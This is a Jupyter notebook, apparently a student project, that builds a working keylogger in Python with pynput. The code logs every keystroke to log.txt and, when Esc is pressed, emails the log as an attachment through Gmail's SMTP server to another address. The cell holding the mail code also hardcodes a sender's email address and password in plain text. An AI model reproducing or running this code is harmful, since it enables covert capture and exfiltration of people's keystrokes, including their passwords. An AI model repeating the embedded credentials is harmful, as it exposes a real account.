{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pynput in c:\\users\\llohi\\anaconda3\\lib\\site-packages (1.7.5)Note: you may need to restart the kernel to use updated packages.\n",
      "\n",
      "Requirement already satisfied: six in c:\\users\\llohi\\anaconda3\\lib\\site-packages (from pynput) (1.15.0)\n"
     ]
    }
   ],
   "source": [
    "pip install pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Imported Libraries\n",
    "\n",
    "import pynput\n",
    "from pynput.keyboard import Key, Listener   # Listener will listen to the key events\n",
    "import os\n",
    "import smtplib\n",
    "from email.mime.multipart import MIMEMultipart\n",
    "from email.mime.text import MIMEText\n",
    "from email.mime.base import MIMEBase\n",
    "from email import encoders"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Reference : https://www.codespeedy.com/send-email-with-file-attachment-in-python-with-smtp/\n",
    "\n",
    "# Requirements:\n",
    "\n",
    "# https://myaccount.google.com/lesssecureapps , turn it on\n",
    "# We are sending mail using Gmail having port number 587\n",
    "# The file to be sent and your python code should be present in the same folder."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "'a' pressed\n",
      "Key.space pressed\n",
      "'a' pressed\n",
      "Key.space pressed\n",
      "'a' pressed\n",
      "Key.space pressed\n",
      "'a' pressed\n",
      "Key.space pressed\n",
      "'a' pressed\n",
      "'a' pressed\n",
      "'a' pressed\n",
      "'a' pressed\n",
      "'a' pressed\n",
      "'a' pressed\n",
      "'a' pressed\n",
      "'a' pressed\n",
      "Key.esc pressed\n",
      "YOUR MAIL HAS BEEN SENT SUCCESSFULLY\n"
     ]
    }
   ],
   "source": [
    "count = 0     # variable used to count number of keys pressed \n",
    "keys = []     # empty list declared to append all the keys entered.\n",
    "\n",
    "def write_file(keys):                      # function used to write the content in keys list to the log file\n",
    "    with open(\"log.txt\",\"a\") as f:         # opening the log.txt \n",
    "        for key in keys:                   # iterating every value in the keys list \n",
    "            k = str(key).replace(\"'\",\"\")   # replacing \"'\" to \"\"\n",
    "            if k.find(\"space\") > 0:        # If a space key is entered it will store as space Key, so we are searching for that key\n",
    "                f.write(\"\\n\")              # If space key is detected we are making the next text to printed in the next line.\n",
    "            elif k.find(\"Key\") == -1:      # we are ignoring the remaining non alpha numeric and special character keys.\n",
    "                f.write(k)                 # writing the alphanumeric and special characters to the file.\n",
    "    \n",
    "\n",
    "def on_press(key):                       # function used to identify the keys pressed and count the number of keys pressed\n",
    "    global keys, count                   # calling the global variables\n",
    "    \n",
    "    keys.append(key)                     # append the entered key to the list of keys\n",
    "    count = count + 1                    # enter the number of keys\n",
    "    print(\"{0} pressed\".format(key))     # prints the key pressed\n",
    "    \n",
    "    if count >=1:                        # for every key pressed we are writing to the text file \n",
    "        count = 0                        # reinitializing the count to 0 , for the next keys\n",
    "        write_file(keys)                 # writing the keys using a function write_file\n",
    "        keys = []                        # reinitializing keys to empty list\n",
    "\n",
    "    \n",
    "def on_release(key):                    # fucntion used to stop the program\n",
    "    if key == Key.esc:                  # If escape is pressed code will stop executing and key logger will be disabled(useed for our convinience)\n",
    "        sender_email = \"lohith.boddu@praxis.ac.in\"   # sender email address\n",
    "        receiver_email = \"chinthala.vamsi.preetham@praxis.ac.in\"   # reciever email address\n",
    "        message = MIMEMultipart()\n",
    "        message[\"From\"] = sender_email\n",
    "        message['To'] = receiver_email\n",
    "        message['Subject'] = \"Key Logger DSP Project\"             # subject of the mail\n",
    "        file = \"log.txt\"                                          # file to be sent\n",
    "        attachment = open(file,'rb')\n",
    "        obj = MIMEBase('application','octet-stream')\n",
    "        obj.set_payload((attachment).read())\n",
    "        encoders.encode_base64(obj)\n",
    "        obj.add_header('Content-Disposition',\"attachment; filename= \"+file)\n",
    "        message.attach(obj)                                       # attaching the file\n",
    "        my_message = message.as_string()\n",
    "        email_session = smtplib.SMTP('smtp.gmail.com',587)\n",
    "        email_session.starttls()\n",
    "        email_session.login(sender_email,'Welcome@2021')           # Authenticating the senders email\n",
    "        email_session.sendmail(sender_email,receiver_email,my_message)  # sending the email\n",
    "        email_session.quit()                                      # logging out the email\n",
    "        print(\"YOUR MAIL HAS BEEN SENT SUCCESSFULLY\")     \n",
    "        attachment.close()\n",
    "        return False                   # closing the code if escape is entered.\n",
    "    \n",
    "with Listener(on_press = on_press, on_release=on_release) as listener:  # on_press and on_release are functions which will note the keys when they are pressed and when they are released\n",
    "    listener.join()                                                     # the loop will constantly run until we break it."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "a a a a aaaaaaaa"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
